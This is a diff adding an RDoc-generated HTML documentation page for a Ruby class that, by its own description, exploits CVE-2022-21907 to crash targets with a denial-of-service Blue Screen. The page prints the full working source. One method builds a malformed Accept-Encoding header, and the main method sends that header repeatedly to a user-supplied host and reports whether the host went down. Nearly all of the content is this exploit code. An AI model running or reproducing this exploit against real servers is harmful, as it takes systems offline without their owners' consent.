@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="UTF-8">
+
+<title>class CVE202221907 - RDoc Documentation</title>
+
+<script type="text/javascript">
+  var rdoc_rel_prefix = "./";
+  var index_rel_prefix = "./";
+</script>
+
+<script src="./js/navigation.js" defer></script>
+<script src="./js/search.js" defer></script>
+<script src="./js/search_index.js" defer></script>
+<script src="./js/searcher.js" defer></script>
+<script src="./js/darkfish.js" defer></script>
+
+<link href="./css/fonts.css" rel="stylesheet">
+<link href="./css/rdoc.css" rel="stylesheet">
+
+
+<body id="top" role="document" class="class">
+<nav role="navigation">
+  <div id="project-navigation">
+    <div id="home-section" role="region" title="Quick navigation" class="nav-section">
+  <h2>
+    <a href="./index.html" rel="home">Home</a>
+  </h2>
+
+  <div id="table-of-contents-navigation">
+    <a href="./table_of_contents.html#pages">Pages</a>
+    <a href="./table_of_contents.html#classes">Classes</a>
+    <a href="./table_of_contents.html#methods">Methods</a>
+  </div>
+</div>
+
+    <div id="search-section" role="search" class="project-section initially-hidden">
+  <form action="#" method="get" accept-charset="utf-8">
+    <div id="search-field-wrapper">
+      <input id="search-field" role="combobox" aria-label="Search"
+             aria-autocomplete="list" aria-controls="search-results"
+             type="text" name="search" placeholder="Search" spellcheck="false"
+             title="Type to search, Up and Down to navigate, Enter to load">
+    </div>
+
+    <ul id="search-results" aria-label="Search Results"
+        aria-busy="false" aria-expanded="false"
+        aria-atomic="false" class="initially-hidden"></ul>
+  </form>
+</div>
+
+  </div>
+
+  
+
+  <div id="class-metadata">
+    
+    
+<div id="parent-class-section" class="nav-section">
+  <h3>Parent</h3>
+
+  <p class="link"><a href="Object.html">Object</a>
+</div>
+
+    
+    
+    
+<!-- Method Quickref -->
+<div id="method-list-section" class="nav-section">
+  <h3>Methods</h3>
+
+  <ul class="link-list" role="directory">
+    <li ><a href="#method-c-check_up">::check_up</a>
+    <li ><a href="#method-c-generate_encoding_payload">::generate_encoding_payload</a>
+    <li ><a href="#method-c-generate_random_string">::generate_random_string</a>
+    <li ><a href="#method-c-get_stdin_host">::get_stdin_host</a>
+    <li ><a href="#method-c-main">::main</a>
+  </ul>
+</div>
+
+  </div>
+</nav>
+
+<main role="main" aria-labelledby="class-CVE202221907">
+  <h1 id="class-CVE202221907" class="class">
+    class CVE202221907
+  </h1>
+
+  <section class="description">
+    
+<p>This class implements methods to exploit the CVE-2022-21907 for a DOS (Denial of Service) attack (Blue Screen) with ruby.</p>
+
+  </section>
+
+  <section id="5Buntitled-5D" class="documentation-section">
+
+
+
+
+
+     <section id="public-class-5Buntitled-5D-method-details" class="method-section">
+       <header>
+         <h3>Public Class Methods</h3>
+       </header>
+
+      <div id="method-c-check_up" class="method-detail ">
+        <div class="method-heading">
+          <span class="method-name">check_up</span><span
+            class="method-args">(request, uri)</span>
+          <span class="method-click-advice">click to toggle source</span>
+        </div>
+
+        <div class="method-description">
+          <p>This function checks the target state</p>
+
+          <div class="method-source-code" id="check_up-source">
+            <pre><span class="ruby-comment"># File CVE-2022-21907.rb, line 110</span>
+<span class="ruby-keyword">def</span> <span class="ruby-keyword">self</span>.<span class="ruby-identifier ruby-title">check_up</span>(<span class="ruby-identifier">request</span>, <span class="ruby-identifier">uri</span>)
+  <span class="ruby-identifier">res</span> = <span class="ruby-constant">Net</span><span class="ruby-operator">::</span><span class="ruby-constant">HTTP</span>.<span class="ruby-identifier">start</span>(
+    <span class="ruby-identifier">uri</span>.<span class="ruby-identifier">hostname</span>, <span class="ruby-identifier">uri</span>.<span class="ruby-identifier">port</span>,
+    <span class="ruby-value">read_timeout:</span> <span class="ruby-value">60</span>,
+    <span class="ruby-value">open_timeout:</span> <span class="ruby-value">60</span>,
+    <span class="ruby-value">use_ssl:</span> <span class="ruby-identifier">uri</span>.<span class="ruby-identifier">scheme</span> <span class="ruby-operator">==</span> <span class="ruby-string">&#39;https&#39;</span>
+  ) { <span class="ruby-operator">|</span><span class="ruby-identifier">http</span><span class="ruby-operator">|</span> <span class="ruby-identifier">http</span>.<span class="ruby-identifier">request</span>(<span class="ruby-identifier">request</span>) }
+<span class="ruby-keyword">rescue</span> <span class="ruby-constant">Net</span><span class="ruby-operator">::</span><span class="ruby-constant">OpenTimeout</span>, <span class="ruby-constant">Errno</span><span class="ruby-operator">::</span><span class="ruby-constant">ETIMEDOUT</span>, <span class="ruby-constant">SocketError</span>
+  <span class="ruby-identifier">puts</span> <span class="ruby-string">&#39;[!] This host is probably inaccessible&#39;</span>
+  <span class="ruby-value">2</span>
+<span class="ruby-keyword">else</span>
+  <span class="ruby-keyword">nil</span>
+<span class="ruby-keyword">end</span></pre>
+          </div>
+        </div>
+
+
+      </div>
+
+      <div id="method-c-generate_encoding_payload" class="method-detail ">
+        <div class="method-heading">
+          <span class="method-name">generate_encoding_payload</span><span
+            class="method-args">()</span>
+          <span class="method-click-advice">click to toggle source</span>
+        </div>
+
+        <div class="method-description">
+          <p>This function generates a random payload</p>
+
+          <div class="method-source-code" id="generate_encoding_payload-source">
+            <pre><span class="ruby-comment"># File CVE-2022-21907.rb, line 98</span>
+<span class="ruby-keyword">def</span> <span class="ruby-keyword">self</span>.<span class="ruby-identifier ruby-title">generate_encoding_payload</span>
+  <span class="ruby-node">&quot;#{generate_random_string(24)},#{generate_random_string(60)}&amp;&quot;</span> \
+    <span class="ruby-node">&quot;#{generate_random_string(2)}&amp;**&quot;</span> \
+    <span class="ruby-node">&quot;#{generate_random_string(20)}**#{Array(&#39;A&#39;..&#39;Z&#39;).sample},&quot;</span> \
+    <span class="ruby-node">&quot;#{generate_random_string(73)},#{generate_random_string(71)}&quot;</span> \
+    <span class="ruby-node">&quot;,#{generate_random_string(27)},****************************&quot;</span> \
+    <span class="ruby-node">&quot;#{generate_random_string(6)}, *, ,&quot;</span>
+<span class="ruby-keyword">end</span></pre>
+          </div>
+        </div>
+
+
+      </div>
+
+      <div id="method-c-generate_random_string" class="method-detail ">
+        <div class="method-heading">
+          <span class="method-name">generate_random_string</span><span
+            class="method-args">(size)</span>
+          <span class="method-click-advice">click to toggle source</span>
+        </div>
+
+        <div class="method-description">
+          <p>This function generates a random string</p>
+
+          <div class="method-source-code" id="generate_random_string-source">
+            <pre><span class="ruby-comment"># File CVE-2022-21907.rb, line 90</span>
+<span class="ruby-keyword">def</span> <span class="ruby-keyword">self</span>.<span class="ruby-identifier ruby-title">generate_random_string</span>(<span class="ruby-identifier">size</span>)
+  <span class="ruby-identifier">upper_characters</span> = <span class="ruby-constant">Array</span>(<span class="ruby-string">&#39;A&#39;</span><span class="ruby-operator">..</span><span class="ruby-string">&#39;Z&#39;</span>)
+  <span class="ruby-constant">Array</span>.<span class="ruby-identifier">new</span>(<span class="ruby-identifier">size</span>) { <span class="ruby-identifier">upper_characters</span>.<span class="ruby-identifier">sample</span> }.<span class="ruby-identifier">join</span>
+<span class="ruby-keyword">end</span></pre>
+          </div>
+        </div>
+
+
+      </div>
+
+      <div id="method-c-get_stdin_host" class="method-detail ">
+        <div class="method-heading">
+          <span class="method-name">get_stdin_host</span><span
+            class="method-args">()</span>
+          <span class="method-click-advice">click to toggle source</span>
+        </div>
+
+        <div class="method-description">
+          <p>This function gets target host from the STDIN</p>
+
+          <div class="method-source-code" id="get_stdin_host-source">
+            <pre><span class="ruby-comment"># File CVE-2022-21907.rb, line 82</span>
+<span class="ruby-keyword">def</span> <span class="ruby-keyword">self</span>.<span class="ruby-identifier ruby-title">get_stdin_host</span>
+  <span class="ruby-identifier">print</span> <span class="ruby-string">&#39;Host (target): &#39;</span>
+  <span class="ruby-identifier">gets</span>.<span class="ruby-identifier">strip</span>
+<span class="ruby-keyword">end</span></pre>
+          </div>
+        </div>
+
+
+      </div>
+
+      <div id="method-c-main" class="method-detail ">
+        <div class="method-heading">
+          <span class="method-name">main</span><span
+            class="method-args">()</span>
+          <span class="method-click-advice">click to toggle source</span>
+        </div>
+
+        <div class="method-description">
+          <p>The main function to launch the attack</p>
+
+          <div class="method-source-code" id="main-source">
+            <pre><span class="ruby-comment"># File CVE-2022-21907.rb, line 127</span>
+<span class="ruby-keyword">def</span> <span class="ruby-keyword">self</span>.<span class="ruby-identifier ruby-title">main</span>
+  <span class="ruby-identifier">host</span> = <span class="ruby-constant">ARGV</span>[<span class="ruby-value">0</span>] <span class="ruby-operator">||</span> <span class="ruby-identifier">get_stdin_host</span>
+
+  <span class="ruby-identifier">uri</span> = <span class="ruby-constant">URI</span>(<span class="ruby-node">&quot;http://#{host}&quot;</span>)
+  <span class="ruby-identifier">request</span> = <span class="ruby-constant">Net</span><span class="ruby-operator">::</span><span class="ruby-constant">HTTP</span><span class="ruby-operator">::</span><span class="ruby-constant">Get</span>.<span class="ruby-identifier">new</span>(<span class="ruby-identifier">uri</span>)
+
+  <span class="ruby-identifier">access_error</span> = <span class="ruby-identifier">check_up</span>(<span class="ruby-identifier">request</span>, <span class="ruby-identifier">uri</span>)
+  <span class="ruby-keyword">return</span> <span class="ruby-identifier">access_error</span> <span class="ruby-keyword">if</span> <span class="ruby-identifier">access_error</span>
+
+  <span class="ruby-identifier">request</span>[<span class="ruby-string">&#39;Accept-Encoding&#39;</span>] = <span class="ruby-identifier">generate_encoding_payload</span>
+  <span class="ruby-identifier">vulnerable</span> = <span class="ruby-keyword">false</span>
+
+  <span class="ruby-value">10</span>.<span class="ruby-identifier">times</span> <span class="ruby-keyword">do</span>
+    <span class="ruby-constant">Net</span><span class="ruby-operator">::</span><span class="ruby-constant">HTTP</span>.<span class="ruby-identifier">start</span>(
+      <span class="ruby-identifier">uri</span>.<span class="ruby-identifier">hostname</span>, <span class="ruby-identifier">uri</span>.<span class="ruby-identifier">port</span>,
+      <span class="ruby-value">read_timeout:</span> <span class="ruby-value">10</span>,
+      <span class="ruby-value">open_timeout:</span> <span class="ruby-value">10</span>,
+      <span class="ruby-value">use_ssl:</span> <span class="ruby-identifier">uri</span>.<span class="ruby-identifier">scheme</span> <span class="ruby-operator">==</span> <span class="ruby-string">&#39;https&#39;</span>
+    ) { <span class="ruby-operator">|</span><span class="ruby-identifier">http</span><span class="ruby-operator">|</span> <span class="ruby-identifier">http</span>.<span class="ruby-identifier">request</span>(<span class="ruby-identifier">request</span>) }
+  <span class="ruby-keyword">rescue</span> <span class="ruby-constant">Net</span><span class="ruby-operator">::</span><span class="ruby-constant">OpenTimeout</span>, <span class="ruby-constant">Errno</span><span class="ruby-operator">::</span><span class="ruby-constant">ETIMEDOUT</span>
+    <span class="ruby-identifier">vulnerable</span> = <span class="ruby-keyword">true</span>
+    <span class="ruby-keyword">break</span>
+  <span class="ruby-keyword">end</span>
+
+  <span class="ruby-keyword">if</span> <span class="ruby-identifier">vulnerable</span>
+    <span class="ruby-identifier">puts</span> <span class="ruby-node">&quot;[+] Target: #{host} is vulnerable and down.&quot;</span>
+    <span class="ruby-value">0</span>
+  <span class="ruby-keyword">else</span>
+    <span class="ruby-identifier">puts</span> <span class="ruby-node">&quot;[-] Target: #{host} is not vulnerable and up.&quot;</span>
+    <span class="ruby-value">1</span>
+  <span class="ruby-keyword">end</span>
+<span class="ruby-keyword">end</span></pre>
+          </div>
+        </div>
+
+
+      </div>
+
+    </section>
+
+  </section>
+</main>
+
+
+<footer id="validator-badges" role="contentinfo">
+  <p><a href="https://validator.w3.org/check/referer">Validate</a>
+  <p>Generated by <a href="https://ruby.github.io/rdoc/">RDoc</a> 6.4.0.
+  <p>Based on <a href="http://deveiate.org/projects/Darkfish-RDoc/">Darkfish</a> by <a href="http://deveiate.org">Michael Granger</a>.
+</footer>
+
